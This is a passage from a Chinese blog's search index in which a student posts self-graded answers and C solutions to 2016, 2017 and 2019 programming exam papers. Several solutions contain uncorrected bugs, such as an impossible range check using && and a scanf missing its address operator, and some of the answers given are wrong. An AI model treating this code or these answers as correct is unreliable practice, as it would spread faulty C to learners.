<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2016年真题解析</title>
    <url>/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="2016年真题解析"><a href="#2016年真题解析" class="headerlink" title="2016年真题解析"></a>2016年真题解析</h1><h1 id="临时存答案"><a href="#临时存答案" class="headerlink" title="临时存答案"></a>临时存答案</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、选择题 得18分</span><br><span class="line">1.A 2.C 3.B 4.B(A) 5.A </span><br><span class="line">6.D 7.B 8.A 9.D 10.B</span><br><span class="line">二、判断题 得18分</span><br><span class="line">错 对 错 对 错</span><br><span class="line">错 错（对） 对 对 错</span><br><span class="line">三、程序分析题 得30分</span><br><span class="line">21.</span><br><span class="line">主要功能：一个计算器，根据用户输入的符号来计算两个整数运算的结果。</span><br><span class="line">输出数据：</span><br><span class="line">12 + 120 = 132</span><br><span class="line">60 / 3 =20</span><br><span class="line">22.</span><br><span class="line">主要功能：对用户输入的n个数字进行从小到大的冒泡排序</span><br><span class="line">输出数据：</span><br><span class="line">OUTPUT:13  27  32  38  49  55  61  76  86  97</span><br><span class="line">23.</span><br><span class="line">主要功能：将用户输入的字符串中的小写字符变成大写字符</span><br><span class="line">输出数据：</span><br><span class="line">Output:INTRODUCTION OF C++ LANGUAGE</span><br></pre></td></tr></table></figure>

<p>四、程序设计题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> score;</span><br><span class="line">	<span class="keyword">char</span> grade;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个百分制整数：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line">	<span class="keyword">if</span> ((score &lt; <span class="number">0</span>) &amp;&amp; (score &gt; <span class="number">100</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n请输入正确的数字！&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">		grade = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((score &gt;= <span class="number">80</span>) &amp;&amp; (score &lt;= <span class="number">89</span>)) &#123;</span><br><span class="line">		grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((score &gt;= <span class="number">70</span>) &amp;&amp; (score &lt;= <span class="number">79</span>)) &#123;</span><br><span class="line">		grade = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((score &gt;= <span class="number">60</span>) &amp;&amp; (score &lt;= <span class="number">69</span>)) &#123;</span><br><span class="line">		grade = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (score &lt; <span class="number">60</span>) &#123;</span><br><span class="line">		grade = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n等级为：%c&quot;</span>, grade);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一串字符:&quot;</span>);</span><br><span class="line">		<span class="keyword">char</span> ar[<span class="number">200</span>];</span><br><span class="line">	gets_s(ar);</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(ar);</span><br><span class="line">	<span class="keyword">int</span> j, i;</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	j = len - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &gt; i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ar[i] == ar[j]) &#123;</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\nNO&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nYes&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//26</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;请输入数组的阶数和数组：&quot;);</span><br><span class="line">	int n;</span><br><span class="line">	int ar[5][5];</span><br><span class="line">	scanf(&quot;%d&quot;,n);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	for(int i =0 ;i&lt;n;i++)&#123;</span><br><span class="line">		for(int j =0 ;j&lt;n;j++)&#123;</span><br><span class="line">			scanf(&quot;%d&quot;,&amp;ar[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	int sum = 0;</span><br><span class="line">	for(int i =0 ;i&lt;n;i++)&#123;</span><br><span class="line">		sum += ar[i][i];</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;sum = %d&quot;,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="题"><a href="#题" class="headerlink" title="题"></a>题</h1><p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154328992-1699343107614.png" alt="image-20231107154328992"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154333910-1699343107614.png" alt="image-20231107154333910"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154338053-1699343107614.png" alt="image-20231107154338053"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154347663-1699343107614.png" alt="image-20231107154347663"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154358349-1699343107614.png" alt="image-20231107154358349"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154403397-1699343107614.png" alt="image-20231107154403397"></p>
<p><img src="/2023/11/07/2016%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231107154408144-1699343107614.png" alt="image-20231107154408144"></p>
<p>不解析了好吧，146分，错的那两个是dinner题。</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>2017年真题解析</title>
    <url>/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="2017年真题解析"><a href="#2017年真题解析" class="headerlink" title="2017年真题解析"></a>2017年真题解析</h1><p>好累，还有40+天了，感觉要死了，😋考研是真痛苦啊。</p>
<h1 id="零时存答案"><a href="#零时存答案" class="headerlink" title="零时存答案"></a>零时存答案</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、选择题 全对-20分</span><br><span class="line">1.c 2.a 3.d 4.a 5.d</span><br><span class="line">6.a 7.c 8.b 9.a 10.d</span><br><span class="line">二、判断题 错了一个-18分</span><br><span class="line">11~15：错 错（错了） 错 对 错</span><br><span class="line">16~20：错 错 对 错 对</span><br><span class="line">三、程序分析题 错了一个输出-23分</span><br><span class="line">21.正确的</span><br><span class="line">主要功能：将三个数据按从大到小排序</span><br><span class="line">输出：67 56 48</span><br><span class="line">22.错误的</span><br><span class="line">主要功能：输出两个学生的姓名和总分</span><br><span class="line">输出：</span><br><span class="line">name: Zhangwei total=170.0//更正float 保留六位小数，double 保留12位小数</span><br><span class="line">name :Wangfeng total=150.0</span><br><span class="line">23.正确的</span><br><span class="line">主要功能：找出用户输入的数组中的最大值和最大值对应的索引</span><br><span class="line">输出：a[0][0]=77</span><br></pre></td></tr></table></figure>

<p>四、程序设计题（52分把，毕竟第一个都弄错了）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//24.错完了！</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> yingwen, kongge, shuzi, qita;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一串字符：&quot;</span>);</span><br><span class="line">	yingwen = <span class="number">0</span>;</span><br><span class="line">	kongge = <span class="number">0</span>;</span><br><span class="line">	shuzi = <span class="number">0</span>;</span><br><span class="line">	qita = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> input[<span class="number">127</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">	<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (input[index] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (((<span class="string">&#x27;a&#x27;</span> &lt;= input[index]) &amp;&amp; (<span class="string">&#x27;z&#x27;</span> &gt;= input[index])) || ((<span class="string">&#x27;A&#x27;</span> &lt;= input[index]) &amp;&amp; (<span class="string">&#x27;Z&#x27;</span> &gt;= input[index]))) &#123;</span><br><span class="line">			yingwen++;</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (input[index] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">			kongge++;</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((<span class="string">&#x27;0&#x27;</span> &lt;= input[index]) &amp;&amp; (<span class="string">&#x27;9&#x27;</span> &gt;= input[index])) &#123;</span><br><span class="line">			shuzi++;</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			qita++;</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n这串字符中有%d个英文字母，%d个数字，%d个空格,%d个其他字符&quot;</span>, yingwen, shuzi, kongge, qita);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> item[<span class="number">20</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> xing[<span class="number">20</span>] = <span class="string">&quot;* * * * * * *&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, item, xing);</span><br><span class="line">		item[i] = <span class="string">&#x27; &#x27;</span> ;<span class="comment">//每一次增加一个空格</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//别忘记加换行！！！（扣一分）</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">float</span> yuwen;</span><br><span class="line">	<span class="keyword">float</span> shuxue;</span><br><span class="line">	<span class="keyword">float</span> waiyu;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">arr</span>[4] =</span> &#123; &#123;<span class="string">&quot;zhao&quot;</span>,<span class="number">97.5</span>,<span class="number">69.0</span>,<span class="number">78.0</span>&#125;,&#123;<span class="string">&quot;qian&quot;</span>,<span class="number">80.0</span>,<span class="number">93.0</span>,<span class="number">87.5</span>&#125;,&#123;<span class="string">&quot;sun&quot;</span>,<span class="number">75.0</span>,<span class="number">89.5</span>,<span class="number">68.5</span>&#125;,&#123;<span class="string">&quot;li&quot;</span>,<span class="number">72.5</span>,<span class="number">68.5</span>,<span class="number">54.0</span>&#125; &#125;;</span><br><span class="line">	<span class="keyword">float</span> max;</span><br><span class="line">	<span class="keyword">int</span> max_index;</span><br><span class="line">	max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">float</span> sum = arr[i].yuwen + arr[i].shuxue+arr[i].waiyu;</span><br><span class="line">		<span class="keyword">float</span> average = sum / <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (average &gt; max) &#123;</span><br><span class="line">			max = average;</span><br><span class="line">			max_index = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;平均分最高的是：%s,其语文成绩为：%f，数学成绩为：%f，外语成绩为：%f&quot;</span>, arr[max_index].name, arr[max_index].yuwen, arr[max_index].shuxue, arr[max_index].waiyu;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//注意输出时候的浮点数 扣一分把</span></span><br></pre></td></tr></table></figure>

<p>113分</p>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p>这个不说了，都很简单</p>
<p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194502239.png" alt="image-20231103194502239"></p>
<h2 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h2><p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194511210.png" alt="image-20231103194511210"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194521906.png" alt="image-20231103194521906"></p>
<p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194529206.png" alt="image-20231103194529206"></p>
<p>这个也不说了</p>
<p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194608200.png" alt="image-20231103194608200"></p>
<p>这道题值得注意的一点是，float保留6位小数，double也是6位</p>
<p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194810789.png" alt="image-20231103194810789"></p>
<p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103194815148.png" alt="image-20231103194815148"></p>
<p>这道题中间的<code>scanf(&quot;%d&quot;,&amp;a[i])</code>这个a是二维数组，而a[i]就代表了第i行的首地址。如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>] = &#123; &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125; &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *(a[<span class="number">1</span>]));</span><br><span class="line">&#125;<span class="comment">//输出3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>] = &#123; &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125; &#125;;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *(a[<span class="number">1</span>]));</span><br><span class="line">&#125;<span class="comment">//若输入为6则输出6，加不加&amp;都是一样</span></span><br></pre></td></tr></table></figure>

<h1 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h1><p><img src="/2023/11/03/2017%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231103195811226.png" alt="image-20231103195811226"></p>
<p>其他两个看我前面的编程就行，现在着重讲一下第一题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[SIZE];</span><br><span class="line">	<span class="keyword">int</span> english=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> space=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> number = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> other=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//scanf(&quot;%s&quot;,str);</span></span><br><span class="line">	<span class="comment">//scanf() 以 空格 或 回车符 结束读取，空格 或 回车符 会遗留在缓冲区。</span></span><br><span class="line">	<span class="comment">//不能直接输入带空格的字符串。</span></span><br><span class="line">	<span class="comment">//不能用scanf我在这被卡了半天</span></span><br><span class="line">	gets_s(str);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; str[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;<span class="comment">//判断字符串尾</span></span><br><span class="line">		<span class="keyword">if</span> (str[i]&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; str[i]&lt;=<span class="string">&#x27;z&#x27;</span> || str[i]&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; str[i]&lt;=<span class="string">&#x27;Z&#x27;</span>) &#123;<span class="comment">//这里面的条件都要变量在前面才行</span></span><br><span class="line">			english++;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">			space++;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;0&#x27;</span>&amp;&amp; str[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">			number++;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			other++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;english: %d\n&quot;</span>, english);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;space: %d\n&quot;</span>, space);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;number: %d\n&quot;</span>, number);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;other: %d\n&quot;</span>, other);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>2019年真题解析</title>
    <url>/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="2019年真题解析"><a href="#2019年真题解析" class="headerlink" title="2019年真题解析"></a>2019年真题解析</h1><p>哪个学校的我就不说了，你们信息收集那么厉害肯定找得到</p>
<p>单纯放一下我对一些题目的总结</p>
<h1 id="临时存答案"><a href="#临时存答案" class="headerlink" title="临时存答案"></a>临时存答案</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">答题卡</span><br><span class="line">一、单选题</span><br><span class="line">1.D 2.D 3.A 4.C 5.B</span><br><span class="line">6.C 7.D 8.D 9.A 10.B</span><br><span class="line">//正确答案  CDACB CADAB 错2个  </span><br><span class="line">//16分</span><br><span class="line">二、判断题</span><br><span class="line">1.对 2.错 3.错 4.错 5.错</span><br><span class="line">6.错 7.对 8.错 9.对 10.对</span><br><span class="line">//正确答案  TFFTF FTFFF 错了3个</span><br><span class="line">//14分</span><br><span class="line">三、程序分析题</span><br><span class="line">21.</span><br><span class="line">程序功能：输出年龄最大的那个人的姓名和年龄</span><br><span class="line">程序运行结果：Liming,58  </span><br><span class="line">//正确 10分</span><br><span class="line">22.</span><br><span class="line">程序功能：判断第二个字符串是否在第一个字符串里面，在的话就输出yes，不在就输出no //正确</span><br><span class="line">（1）程序结果：no //正确</span><br><span class="line">（2）程序结果：yes //错误</span><br><span class="line">//3分吧</span><br><span class="line">23.</span><br><span class="line">程序功能：把大写变成小写，把小写变成大写</span><br><span class="line">程序结果：tHIS IS A TEST OF c pROGRAM lANGUAGE!</span><br><span class="line">//十分</span><br></pre></td></tr></table></figure>

<p>四、程序设计图</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//24题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//计算数周围，也就是第一行的，最后一行的，中间行的第一个和最后一个加起来即可</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == M - <span class="number">1</span>) &#123;</span><br><span class="line">                sum += <span class="built_in">array</span>[i][j];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="number">0</span>&lt;i&lt;M) &amp;&amp; ((j == <span class="number">0</span>) || (j == N - <span class="number">1</span>))) &#123;</span><br><span class="line">                sum += <span class="built_in">array</span>[i][j];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//首先获取二维数组</span></span><br><span class="line">    <span class="keyword">int</span> hang, lie;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这是一个3行4列的二维数组，请按照提示输入数组的内容&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> arry[M][N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第%d行的第%d列的元素:\n&quot;</span>,i+<span class="number">1</span>,j+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arry[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//展示数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n展示数组\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,arry[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;数组的边界之和为：%d&quot;</span>, fun(arry));</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230918191104976-1695265255992.png" alt="image-20230918191104976"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//25题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">arr</span>[4];</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入第%d个学生的姓名和成绩:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>,&amp;arr[i].name,&amp;arr[i].data);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//排序</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">buff</span>;</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N  ; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; N; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[i].data &lt; arr[j].data) &#123;</span><br><span class="line">				buff = arr[i];</span><br><span class="line">				arr[i] = arr[j];</span><br><span class="line">				arr[j] = buff;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span 